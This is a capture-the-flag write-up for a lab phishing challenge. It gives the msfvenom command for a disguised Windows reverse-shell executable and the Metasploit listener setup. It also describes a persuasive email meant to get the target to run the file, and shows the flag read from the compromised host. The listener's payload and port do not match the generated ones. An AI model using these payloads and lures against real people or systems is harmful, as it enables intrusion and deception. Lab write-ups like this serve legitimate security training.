# Shadow Phishing 

## Challenge Description
> ![image](https://github.com/user-attachments/assets/2d4d357f-3338-4c38-80aa-cd57e3ddcc0c)

## Solution
This challenge is similar to **Ghost Phishing**

To begin, we access the webmail interface at:
`http://10.10.225.139/`

Using the provided credentials:
`Username: shadowbyte@darknetmail.corp`
`Password: ShadowIsTheBest`

This grants us access to ShadowByte’s email account. Our objective is to craft and deliver a malicious Win10 x64 executable to our target, Cipher (cipher@darknetmail.corp).

![image](https://github.com/user-attachments/assets/5155d5ae-315d-4384-8de7-f4e691e82239)

> [!NOTE]  
> ### Steps to Generate the Malicious Windows Executable
> 1. To create our payload, we use msfvenom to generate a Windows x64 executable that establishes a reverse shell upon execution:
>    
>    ```
>    sudo msfvenom -a x64 — platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<your_local_ip> LPORT=4444 -f exe > SilentEdgeInstaller.exe
>    ```

![image](https://github.com/user-attachments/assets/0b08f909-610c-4043-95de-f72eab54f7f0)

To receive a connection when the target opens the malicious executable, we used Metasploit’s multi/handler module:
> [!NOTE]  
> ### Setting Up a Listener
> 1. Open a terminal and start Metasploit:
>    
>    ```
>    msfconsole
>    ```
> 2. Set up the listener:
>
>    ```
>    use multi/handler
>    set payload windows/meterpreter/reverse_tcp
>    set LHOST <ATTACKBOX_IP>
>    set LPORT 8888
>    ```
> 3. Verify the settings:
>       
>    ```
>    show options
>    ```
> 4. Start listening for connections:
>
>    ```
>    exploit
>    ```      

Now, when the target opens the executable, we will receive a reverse shell.

The next step is to send the phishing email.
> [!NOTE]
> ### Sending the Phishing Email
> 1. Log into the webmail interface.
> 2. Compose a new email addressed to cipher@darknetmail.corp.
> 3. Attach the malicious executable (renaming it to something convincing like SilentEdgeInstaller.exe).
> 4. Write a persuasive message to encourage the recipient to open the document.
> 5. Send the email.

Once the target opens the document, our reverse shell should trigger within ~2 minutes.

After some time, we receive a Meterpreter session, confirming that Cipher has executed the payload:

![image](https://github.com/user-attachments/assets/cc0482e6-0e1f-4b96-ab7c-a146f8506776)

We navigated to the Administrator’s Desktop:
```
meterpreter > cd c:/users/Administrator/Desktop
meterpreter > ls
```
We retrieved the flag:
```
meterpreter > cat flag.txt
THM{3m41l_ph1sh1ng_1s_3z}
```

![image](https://github.com/user-attachments/assets/082f1e3d-75cf-4959-b3ac-d24c38994236)

## Conclusion
The challenge demonstrated the effectiveness of phishing attacks in compromising a target system. Crafting a convincing email is crucial for successful phishing attacks. 
The Metasploit framework provides robust modules for creating payloads and handling connections.

## Flag
THM{3m41l_ph1sh1ng_1s_3z}
